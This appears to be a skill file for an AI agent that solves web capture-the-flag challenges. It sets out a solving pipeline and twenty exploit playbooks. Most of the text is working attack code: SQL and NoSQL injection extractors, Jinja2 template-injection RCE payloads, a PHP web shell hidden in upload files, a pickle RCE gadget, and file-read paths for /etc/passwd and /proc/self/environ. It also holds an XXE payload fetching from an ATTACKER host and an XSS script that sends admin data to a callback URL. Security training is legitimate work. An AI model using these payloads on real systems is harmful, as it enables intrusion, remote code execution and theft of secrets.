# ctf-web

## Description

Web exploitation skill for CTF challenges. Covers black-box and white-box web targets:
SQLi, NoSQLi, XSS, admin bot, SSRF, LFI/RFI, upload bugs, JWT/session forgery,
IDOR, SSTI, deserialization, XXE, GraphQL, OAuth/OIDC, CORS/CSRF, prototype pollution,
request smuggling, cache poisoning, PDF/browser rendering bugs, webhooks, race conditions,
and source-code-driven exploit chains.

**Scope rule:** run this only against local challenge instances, provided CTF infrastructure,
or systems where you have explicit authorization.

**Harness rule:** local solve first. Remote solve second. No accepted/verified flag evidence,
no final answer.

---

## Trigger Signals

Load this skill when challenge material contains any of:

```text
URL, HTTP, HTTPS, API, login, cookie, session, JWT, SQL, upload, SSRF, XSS,
bot, admin, GraphQL, OAuth, SAML, template, Jinja, Flask, Express, PHP, Laravel,
Spring, Rails, Next.js, React Server Components, webhook, PDF, browser, cache,
nginx, apache, haproxy, reverse proxy
```

Pivot away when:

```text
native memory corruption dominates -> ctf-pwn
main task is reversing a binary/client -> ctf-reverse
main weakness is RSA/AES/hash/math -> ctf-crypto
main task is PCAP/disk/image recovery -> ctf-forensics
main task is jail/protocol/esolang -> ctf-misc
GitHub Actions/cloud/CI is primary -> ctf-cloud-ci
```

---

## Required Pipeline

Every web challenge must follow:

```text
TRIAGE -> RECON -> HYPOTHESIS -> LOCAL EXPLOIT -> LOCAL VERIFY -> REMOTE EXPLOIT -> REMOTE VERIFY -> REPORT
```

Do not jump directly to remote unless there is no local artifact and the challenge is remote-only.

### State updates

After each phase, update:

```text
workspaces/<challenge>/state.json
workspaces/<challenge>/notes/NOTES.md
workspaces/<challenge>/recon/*
workspaces/<challenge>/evidence/*
```

Minimum `state.json` fields:

```json
{
  "challenge": "name",
  "category": "web",
  "phase": "recon",
  "target": {
    "local": "http://127.0.0.1:PORT",
    "remote": "https://host"
  },
  "confirmed_primitives": [],
  "hypotheses": [],
  "attempts": [],
  "flag": null,
  "flag_verified": false
}
```

---

## Prerequisites

### Python

```bash
python3 -m pip install -U requests httpx beautifulsoup4 lxml pyjwt python-jose itsdangerous flask-unsign \
  aiohttp websockets cryptography pycryptodome rich typer urllib3
```

### System tools

```bash
sudo apt-get update
sudo apt-get install -y curl jq git unzip zip netcat-openbsd ncat socat openssl \
  ffuf gobuster wfuzz feroxbuster seclists whatweb wafw00f nikto \
  exiftool imagemagick qrencode zbar-tools poppler-utils
```

### Node / JS analysis

```bash
npm install -g js-beautify retire deobfuscator
```

### Optional tools

```bash
# sqlmap
python3 -m pip install -U sqlmap || true

# phpggc for PHP deserialization
git clone https://github.com/ambionics/phpggc ~/tools/phpggc 2>/dev/null || true

# ysoserial for Java deserialization
mkdir -p ~/tools
# download ysoserial jar manually if needed
```

**Important correction:** `ysoserial` is normally used as a Java `.jar`, not as a Python package.

Verify:

```bash
which curl jq ffuf gobuster feroxbuster whatweb wafw00f nikto || true
python3 - <<'PY'
import requests, httpx, jwt, bs4
print("python web deps ok")
PY
```

---

## Local-First Setup

### 1. Inspect archive/source

```bash
find . -maxdepth 3 -type f | sort
find . -maxdepth 3 -iname '*docker*' -o -iname 'compose*' -o -iname '*.env*'
grep -RInE 'flag|FLAG|secret|token|jwt|admin|debug|eval|exec|system|subprocess|fetch|curl|requests|template|render|deserialize|pickle|yaml.load|jwt|csrf|upload|pdf|bot|webhook' . 2>/dev/null | head -300
```

### 2. Build/run the intended service

```bash
# Dockerfile
docker build -t ctf-web-local .
docker run --rm -p 127.0.0.1:8080:8080 ctf-web-local

# docker-compose
docker compose up --build
docker compose logs -f
```

Do not create fake `/flag` and call that a solve. A local test flag is useful only to prove
that the exploit primitive can read the same target path or privileged data location.

### 3. Identify flag dataflow

Answer these before exploit:

```text
- Is the real flag in a file, env var, database, admin-only page, bot cookie, CI secret, or internal service?
- Which component can read it?
- Which user-controlled input reaches that component?
- What primitive do we need: file read, SSRF, SQL dump, XSS admin exfil, RCE, token forgery, IDOR?
- Can the same primitive be proven locally without inventing a fake-only path?
```

---

## Recon Checklist

Use `$BASE` for target URL.

```bash
export BASE='http://127.0.0.1:8080'

# Fingerprint
whatweb "$BASE" | tee recon/whatweb.txt
curl -skI "$BASE" | tee recon/headers.txt
curl -sk "$BASE" | tee recon/index.html

# Robots / sitemap / obvious metadata
for p in /robots.txt /sitemap.xml /.well-known/security.txt /.env /.git/HEAD /debug /health /metrics /actuator/env; do
  echo "=== $p ===" | tee -a recon/paths.txt
  curl -sk "$BASE$p" | head -80 | tee -a recon/paths.txt
done

# Directory fuzz
ffuf -u "$BASE/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc all -fc 404 -rate 20 -o recon/ffuf_dirs.json

# File extension fuzz
gobuster dir -u "$BASE" \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,py,js,txt,bak,zip,tar,gz,sql,json,yml,yaml,env \
  -o recon/gobuster.txt

# JS endpoint extraction
mkdir -p recon/js
grep -Eo 'src="[^"]+\.js[^"]*"' recon/index.html | cut -d'"' -f2 | while read -r js; do
  url="$js"; [[ "$url" =~ ^http ]] || url="$BASE/$js"
  fn="recon/js/$(basename "$js" | tr '?&=' '___')"
  curl -sk "$url" -o "$fn"
  js-beautify "$fn" -o "$fn.pretty" 2>/dev/null || true
done
grep -RInE 'api|token|secret|admin|debug|fetch\(|axios|graphql|jwt|flag' recon/js/ 2>/dev/null | tee recon/js_hits.txt
```

---

## White-Box Source Audit

### Routes/controllers

```bash
grep -RInE '@app\.route|Blueprint|router\.|app\.(get|post|put|delete)|Route::|Controller|@RequestMapping|urlpatterns|FastAPI|GraphQL' . 2>/dev/null | tee recon/routes.txt
```

### Sensitive sinks

```bash
grep -RInE 'open\(|readFile|fs\.|send_file|FileResponse|include|require|render_template|Template|eval|exec|system|subprocess|popen|pickle|unserialize|deserialize|yaml\.load|jwt\.decode|verify|secret|admin|flag' . 2>/dev/null | tee recon/sinks.txt
```

### Trust boundary map

For every interesting endpoint, record:

```text
endpoint:
method:
auth required:
input params:
source file/function:
sink:
required primitive:
```

Save this to `recon/attack_surface.md`.

---

## Hypothesis Format

Use ranked hypotheses, not random fuzzing.

```markdown
## Hypothesis H1 — <name>
Signal:
Preconditions:
Primitive expected:
Local proof:
Remote adaptation:
Risk:
Fallback:
```

Example:

```markdown
## H1 — PDF renderer SSRF to local /flag endpoint
Signal: app has /render?url= and bot/pdf worker
Preconditions: renderer can access localhost
Primitive expected: internal HTTP read
Local proof: render http://127.0.0.1:8080/admin returns admin HTML
Remote adaptation: use http://127.0.0.1:<internal-port>/flag
```

---

## Core Exploit Playbooks

## 1. SQL Injection

### Manual probes

```bash
curl -sk "$BASE/item?id=1'"
curl -sk "$BASE/item?id=1 AND 1=1-- -"
curl -sk "$BASE/item?id=1 AND 1=2-- -"
curl -sk "$BASE/item?id=1 UNION SELECT NULL-- -"
```

### Boolean blind extraction skeleton

```python
import requests, string, time

BASE = "http://127.0.0.1:8080"
s = requests.Session()

def oracle(expr: str) -> bool:
    r = s.get(f"{BASE}/item", params={"id": f"1 AND ({expr})"})
    return "known-good-marker" in r.text

def extract(query: str, max_len=128) -> str:
    out = ""
    alphabet = string.printable
    for pos in range(1, max_len + 1):
        hit = None
        for ch in alphabet:
            if oracle(f"substr(({query}),{pos},1)={repr(ch)}"):
                hit = ch
                break
        if hit is None:
            break
        out += hit
        print(out)
    return out

print(extract("select group_concat(name) from sqlite_master"))
```

### sqlmap

```bash
sqlmap -u "$BASE/item?id=1" --batch --dbs
sqlmap -u "$BASE/login" --data 'username=admin&password=test' --batch --level=3 --risk=2
sqlmap -u "$BASE/profile?id=1" --cookie 'session=...' --batch --dump
```

---

## 2. NoSQL Injection

```python
import requests, string

BASE = "http://127.0.0.1:8080"
s = requests.Session()

# Auth bypass
payload = {"username": {"$ne": None}, "password": {"$ne": None}}
print(s.post(f"{BASE}/login", json=payload).text)

# Regex extraction
alphabet = string.ascii_letters + string.digits + "{}_-!@#$."
flag = ""
while not flag.endswith("}"):
    for ch in alphabet:
        p = {"username": "admin", "password": {"$regex": "^" + flag + ch}}
        r = s.post(f"{BASE}/login", json=p)
        if "success" in r.text.lower():
            flag += ch
            print(flag)
            break
    else:
        break
```

---

## 3. SSTI

Detection polyglot:

```text
{{7*7}}          -> 49
${7*7}           -> 49
<%= 7*7 %>       -> 49
#{7*7}           -> 49
*{7*7}           -> 49
{{7*'7'}}        -> 7777777 on Jinja2
```

Jinja2 file read/RCE probes for CTF local targets:

```bash
curl -G "$BASE/search" --data-urlencode "q={{7*7}}"
curl -G "$BASE/search" --data-urlencode "q={{config}}"
curl -G "$BASE/search" --data-urlencode "q={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
curl -G "$BASE/search" --data-urlencode "q={{config.__class__.__init__.__globals__['open']('/flag').read()}}"
```

Bypass filters with `attr`:

```text
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
```

---

## 4. LFI / Arbitrary File Read

```bash
# Basic traversal
curl -sk "$BASE/view?file=../../../../etc/passwd"
curl -sk "$BASE/view?file=/etc/passwd"

# Encoded traversal
curl -sk "$BASE/view?file=..%2f..%2f..%2f..%2fetc%2fpasswd"

# PHP filters
curl -sk "$BASE/view?file=php://filter/convert.base64-encode/resource=index.php"

# Proc leaks
curl -sk "$BASE/view?file=/proc/self/environ"
curl -sk "$BASE/view?file=/proc/self/cmdline"
curl -sk "$BASE/view?file=/proc/self/maps"
```

High-value files:

```text
/flag
/flag.txt
/app/flag.txt
/proc/self/environ
/proc/self/cmdline
/app/.env
/var/www/html/.env
/app/config.py
/app/settings.py
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
```

**Evidence rule:** if local `/flag` is a test flag, prove the exploit can read an equivalent challenge-controlled file path or the exact configured flag path.

---

## 5. File Upload

Check:

```text
extension allowlist
MIME sniffing
magic bytes
image processing
archive extraction
filename normalization
path traversal in filename
double extension
case sensitivity
polyglot payloads
server-side conversion
```

Commands:

```bash
# Double extension
printf '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -sk -F 'file=@shell.php.jpg;type=image/jpeg' "$BASE/upload"

# PNG/PHP polyglot
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > polyglot.png

# zip-slip
python3 - <<'PY'
import zipfile
with zipfile.ZipFile("zipslip.zip","w") as z:
    z.writestr("../../tmp/pwned.txt", "owned")
PY
curl -sk -F 'file=@zipslip.zip' "$BASE/upload"
```

---

## 6. XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

Blind/OOB XXE:

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % dtd SYSTEM "http://ATTACKER/evil.dtd">
  %dtd;
]>
```

DOCX/SVG/PDF converters often parse XML.

---

## 7. SSRF

### Internal HTTP scan

```python
import requests, time

BASE = "http://127.0.0.1:8080"
SSRF = f"{BASE}/fetch?url="

for host in ["127.0.0.1", "localhost", "0.0.0.0", "[::1]"]:
    for port in [80, 443, 3000, 5000, 8000, 8080, 9222, 6379, 27017]:
        url = f"http://{host}:{port}/"
        try:
            r = requests.get(SSRF + url, timeout=3)
            if r.status_code not in [400, 404, 500] or len(r.text) > 50:
                print(url, r.status_code, r.text[:120])
        except Exception:
            pass
        time.sleep(0.2)
```

### URL parser bypasses

```text
http://127.1/
http://2130706433/
http://0x7f000001/
http://0177.0.0.1/
http://localhost./
http://127.0.0.1.nip.io/
http://allowed.com@127.0.0.1/
http://127.0.0.1#allowed.com
http://127.0.0.1?allowed.com
http://[::1]/
gopher://127.0.0.1:6379/_PING
dict://127.0.0.1:6379/info
```

### Metadata endpoints

Use only in authorized CTF cloud environments:

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
http://metadata.google.internal/computeMetadata/v1/
```

---

## 8. JWT / Session Forgery

```python
import base64, json, jwt, requests

def b64json(part):
    return json.loads(base64.urlsafe_b64decode(part + "=" * (-len(part) % 4)))

token = "eyJ..."
h, p, s = token.split(".")
print(b64json(h), b64json(p))

# alg none
payload = b64json(p)
payload["admin"] = True
header = {"alg":"none","typ":"JWT"}
enc = lambda o: base64.urlsafe_b64encode(json.dumps(o,separators=(",",":")).encode()).rstrip(b"=").decode()
print(enc(header) + "." + enc(payload) + ".")

# weak HMAC
for secret in ["secret", "ctf", "flag", "password", "admin", "jwt_secret", "changeme"]:
    try:
        print(secret, jwt.decode(token, secret, algorithms=["HS256"]))
        forged = jwt.encode({**payload, "admin": True}, secret, algorithm="HS256")
        print(forged)
        break
    except Exception:
        pass
```

Flask session:

```bash
flask-unsign --decode --cookie "$COOKIE"
flask-unsign --unsign --cookie "$COOKIE" --wordlist /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
flask-unsign --sign --cookie "{'admin': True}" --secret 'secret'
```

---

## 9. IDOR / Broken Access Control

```python
import requests

BASE = "http://127.0.0.1:8080"
s = requests.Session()
s.cookies.set("session", "ATTACKER")

for uid in range(1, 300):
    r = s.get(f"{BASE}/api/user/{uid}")
    if r.status_code == 200 and any(x in r.text.lower() for x in ["email","flag","secret","admin"]):
        print(uid, r.text[:200])
```

Also test:

```text
numeric IDs
UUIDs leaked in JS
Mongo ObjectIds
hashids
order IDs
file IDs
project/team IDs
role update endpoints
mass assignment fields: is_admin, role, verified, balance
```

---

## 10. XSS / Admin Bot

### Context probes

```text
<script>alert(1)</script>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
${alert(1)}
```

### CTF admin-bot exfil pattern

Use only against the provided bot/admin challenge surface.

```html
<script>
fetch('/admin/flag', {credentials:'include'})
  .then(r=>r.text())
  .then(x=>fetch('https://YOUR-CALLBACK/?d='+encodeURIComponent(x)));
</script>
```

### DOM XSS recon

```bash
grep -RInE 'innerHTML|outerHTML|document.write|location.hash|location.search|postMessage|eval|setTimeout\(' recon/js/ 2>/dev/null
```

### CSP checklist

```text
script-src unsafe-inline
JSONP endpoints on allowed domains
base-uri missing -> base tag hijack
object-src enabled
trusted-types missing
nonce reused or exposed in DOM
same-origin upload served as script
```

---

## 11. CORS / CSRF

CORS probe:

```bash
curl -skI "$BASE/api/me" -H 'Origin: https://evil.example'
curl -sk "$BASE/api/me" -H 'Origin: https://evil.example' -H 'Cookie: session=...'
```

CSRF PoC:

```html
<form action="http://target/change-email" method="POST">
  <input name="email" value="attacker@example.com">
</form>
<script>document.forms[0].submit()</script>
```

Look for:

```text
SameSite=None
Access-Control-Allow-Origin reflected
Access-Control-Allow-Credentials: true
state-changing GET endpoints
missing CSRF token on POST/PUT/PATCH/DELETE
```

---

## 12. Deserialization

### PHP

```bash
php ~/tools/phpggc/phpggc -l | grep -i laravel
php ~/tools/phpggc/phpggc Laravel/RCE1 system 'id' -b
```

### Python pickle

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

print(base64.b64encode(pickle.dumps(RCE())).decode())
```

### Java

```bash
java -jar ~/tools/ysoserial.jar CommonsCollections6 'id' | base64 -w0
```

Do not assume RCE is needed. For CTF, a safer payload often reads `/flag` or triggers an HTTP callback.

---

## 13. GraphQL

```bash
curl -sk -X POST "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name args { name type { name kind } } } } } }"}' \
  | jq .

# Query batching / aliasing
curl -sk -X POST "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  -d '[{"query":"{me{id}}"},{"query":"{flag}"}]' \
  | jq .

# IDOR
curl -sk -X POST "$BASE/graphql" \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id:\"1\") { id email role secret flag } }"}'
```

Check:

```text
introspection
debug errors
batching
alias brute force
field-level auth
mutation mass assignment
SQLi/NoSQLi in arguments
```

---

## 14. Prototype Pollution / Node.js

Payloads:

```json
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
{"__proto__":{"template":"<%= process.mainModule.require('child_process').execSync('id') %>"}}
```

Test with:

```bash
curl -sk -X POST "$BASE/api/profile" \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"isAdmin":true}}'

curl -sk "$BASE/admin"
```

Search source:

```bash
grep -RInE 'lodash|merge|deepmerge|set-value|dot-prop|qs|bodyParser|JSON.parse|vm\.run|Function\(' . 2>/dev/null
```

---

## 15. Request Smuggling / Proxy Mismatch

Only test on local or designated CTF infra.

Signals:

```text
frontend proxy + backend app
nginx/haproxy/apache + node/flask/rails
weird duplicate headers
HTTP/1.1 keep-alive behavior
```

Manual CL.TE probe skeleton:

```python
import socket, ssl

host = "target"
port = 443
raw = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "G"
).encode()

s = socket.create_connection((host, port))
s = ssl.create_default_context().wrap_socket(s, server_hostname=host)
s.sendall(raw)
print(s.recv(4096))
```

---

## 16. Cache Poisoning

Signals:

```text
CDN/proxy cache headers
X-Forwarded-Host reflected
Host used in generated links
unkeyed query/header
static extension cache rule
```

Probe:

```bash
curl -skI "$BASE/" -H 'X-Forwarded-Host: attacker.example'
curl -sk "$BASE/" -H 'Host: attacker.example'
curl -sk "$BASE/static/app.js?x=1" -H 'X-Forwarded-Host: attacker.example'
```

Check headers:

```text
Cache-Control
Age
X-Cache
CF-Cache-Status
Vary
ETag
```

---

## 17. PDF / Browser / Screenshot Renderer

Common CTF chain:

```text
HTML injection -> headless browser/PDF bot -> local file read or SSRF -> flag
```

Payloads:

```html
<iframe src="file:///etc/passwd"></iframe>
<img src="http://127.0.0.1:8080/admin/flag">
<script>
fetch('http://127.0.0.1:8080/admin/flag').then(r=>r.text()).then(x=>document.body.innerText=x)
</script>
```

For wkhtmltopdf/weasyprint/chromium, test:

```text
file:// URL support
localhost access
DNS callback
CSP differences
print CSS fetches
SVG/image XML parsing
```

---

## 18. Webhook / Callback Features

Common chain:

```text
server-side fetch -> SSRF
signed webhook -> HMAC confusion/replay
bot visits webhook output -> XSS
callback URL parser mismatch -> internal access
```

Recon:

```bash
grep -RInE 'webhook|callback|fetch|requests\.get|axios|getaddrinfo|dns|urlparse|parse_url|new URL' . 2>/dev/null
```

---

## 19. Race Conditions

Targets:

```text
coupon redemption
password reset
email verification
file upload processing
payment state
invite acceptance
admin approval queue
```

Python parallel hammer:

```python
import concurrent.futures, requests

BASE = "http://127.0.0.1:8080"
s = requests.Session()

def hit(i):
    return s.post(f"{BASE}/redeem", data={"coupon":"FREE"}).text[:80]

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
    for res in ex.map(hit, range(100)):
        print(res)
```

---

## 20. Command Injection

```python
import requests, time

BASE = "http://127.0.0.1:8080"
TARGET = f"{BASE}/ping"

probes = [
    "127.0.0.1;id",
    "127.0.0.1&&id",
    "127.0.0.1|id",
    "127.0.0.1`id`",
    "127.0.0.1$(id)",
    "127.0.0.1%0aid",
]

for p in probes:
    r = requests.get(TARGET, params={"host": p})
    if "uid=" in r.text:
        print("confirmed", p, r.text)
        break
```

Filter bypasses:

```text
${IFS}
$'\x20'
{cat,/flag}
cat</flag
base64</flag
sh -c 'cat /flag'
```

---

## Solver Template

Save as `workspaces/<challenge>/exploit/solve.py`.

```python
#!/usr/bin/env python3
import argparse, hashlib, json, os, re, sys, time
from pathlib import Path
from urllib.parse import urljoin

import requests
import urllib3
urllib3.disable_warnings()

FLAG_RE = re.compile(rb'([A-Za-z0-9_]{2,20}\{[^}\r\n]{4,200}\}|flag\{[^}\r\n]{4,200}\})', re.I)

def extract_flag(data: bytes):
    m = FLAG_RE.search(data)
    return m.group(1).decode(errors="replace") if m else None

def save_evidence(workspace: Path, mode: str, target: str, transcript: bytes, flag: str | None):
    evdir = workspace / "evidence"
    evdir.mkdir(parents=True, exist_ok=True)
    raw = evdir / f"{mode}_transcript.bin"
    raw.write_bytes(transcript)
    meta = {
        "mode": mode,
        "target": target,
        "flag": flag,
        "transcript_sha256": hashlib.sha256(transcript).hexdigest(),
        "verified": bool(flag),
        "created_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    (evdir / f"{mode}_evidence.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
    return meta

def build_session(proxy=False):
    s = requests.Session()
    s.verify = False
    if proxy:
        s.proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
    return s

def exploit(base: str, proxy=False) -> bytes:
    s = build_session(proxy)
    transcript = bytearray()

    def log_response(name, r):
        block = f"\n=== {name} {r.status_code} {r.url} ===\n".encode() + r.content[:5000]
        transcript.extend(block)
        print(block.decode(errors="replace"))

    # EDIT: implement exploit chain here
    r = s.get(urljoin(base, "/"), timeout=10)
    log_response("index", r)

    # Example:
    # r = s.get(urljoin(base, "/flag"), timeout=10)
    # log_response("flag", r)

    return bytes(transcript)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default=os.environ.get("BASE", "http://127.0.0.1:8080"))
    ap.add_argument("--workspace", default=os.environ.get("WORKSPACE", "."))
    ap.add_argument("--mode", choices=["local", "remote"], default="local")
    ap.add_argument("--proxy", action="store_true")
    args = ap.parse_args()

    transcript = exploit(args.base, args.proxy)
    flag = extract_flag(transcript)
    meta = save_evidence(Path(args.workspace), args.mode, args.base, transcript, flag)

    if flag:
        print(f"[+] FLAG: {flag}")
        print(f"[+] evidence: {meta}")
    else:
        print("[-] no flag found; keep solving")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

---

## Remote Adaptation Rules

Before remote:

```text
- Local exploit primitive is confirmed.
- Payload is parameterized by BASE/HOST/PORT.
- No hardcoded localhost-only route unless SSRF/internal access is intended.
- Rate limit added: >= 0.5s between mutating requests.
- Remote hostname matches challenge scope.
- Solver saves remote transcript and evidence JSON.
```

Example:

```bash
python3 exploit/solve.py --mode local  --base http://127.0.0.1:8080 --workspace "$PWD"
python3 exploit/solve.py --mode remote --base https://challenge.ctf.example --workspace "$PWD"
cat evidence/remote_evidence.json
```

---

## Flag Verification

A flag is credible only if at least one is true:

```text
- It appears in remote response transcript from the official challenge target.
- It is accepted by the official scoreboard/submission endpoint.
- It is read from the intended remote flag source by a confirmed exploit primitive.
- Challenge explicitly prints success after the exploit.
```

Reject or keep solving if:

```text
- flag contains fake/dummy/test/example/local/placeholder
- flag came only from a local file you created
- flag came from comments/sample/test fixtures without a working exploit
- output is only guessed from format
```

Write evidence:

```json
{
  "flag": "CTF{...}",
  "source": "remote transcript",
  "target": "https://...",
  "exploit": "SSTI file read /flag",
  "proof": "transcript sha256 + relevant response excerpt",
  "verified": true
}
```

---

## Report Template

```markdown
# <Challenge> — Web

## Summary
One paragraph: bug class, primitive, final flag source.

## Local Reproduction
Commands to build/run local and prove primitive.

## Exploit Chain
1. Recon finding
2. Vulnerable code / endpoint
3. Payload
4. Local proof
5. Remote adaptation

## Flag Evidence
- Flag:
- Remote transcript:
- SHA256:
- Why this is real, not decoy:

## Files
- exploit/solve.py
- evidence/remote_evidence.json
```

---

## Checklist Before Giving Up

- [ ] Read source, Dockerfile, compose, env examples, seed scripts.
- [ ] Mapped all routes and auth requirements.
- [ ] Downloaded and searched all JS bundles.
- [ ] Checked comments, source maps, hidden endpoints, backup files.
- [ ] Tested SQLi/NoSQLi/SSTI/LFI/SSRF/XSS on every trust-boundary input.
- [ ] Tried alternate HTTP methods and content types.
- [ ] Checked cookies/JWT/session framework secrets.
- [ ] Tested IDOR on numeric IDs, UUIDs, ObjectIds, hashes.
- [ ] Tested upload extension/MIME/magic/polyglot/archive traversal.
- [ ] Checked admin bot/PDF/browser rendering if present.
- [ ] Checked webhooks/callbacks for SSRF/parser mismatch.
- [ ] Checked GraphQL introspection/batching/field auth if present.
- [ ] Checked CORS/CSRF only where state-changing routes exist.
- [ ] Checked cache/proxy poisoning when proxy/CDN headers exist.
- [ ] Proved the primitive locally before remote.
- [ ] Saved remote transcript and evidence JSON.
- [ ] Verified flag is not a sample/test/decoy.
